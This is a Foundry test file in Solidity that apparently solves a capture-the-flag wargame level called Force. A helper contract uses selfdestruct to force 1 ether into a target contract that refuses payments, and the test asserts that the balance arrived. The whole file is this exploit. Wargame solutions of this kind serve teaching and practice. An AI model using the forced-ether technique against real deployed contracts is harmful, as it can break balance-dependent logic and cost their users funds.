// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/Force.sol";


contract FalloutTest is Test {
    Force private force;
    Proxy private proxy;
    address private constant HACKER = address(0x1);
    function setUp() external {
        force = new Force();
        proxy = new Proxy();
        vm.deal(HACKER, 1e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        proxy.destroy(address(force));
        (bool success, ) = address(proxy).call{value: 1e18}(abi.encodeWithSignature("destroy(address)", address(force)));
        require(success, "tx failed");
        
        assertEq(address(force).balance, 1e18);
        vm.stopPrank();
    }
}

contract Proxy {
    function destroy(address _victim) external payable {
        selfdestruct(payable(_victim));
    }
}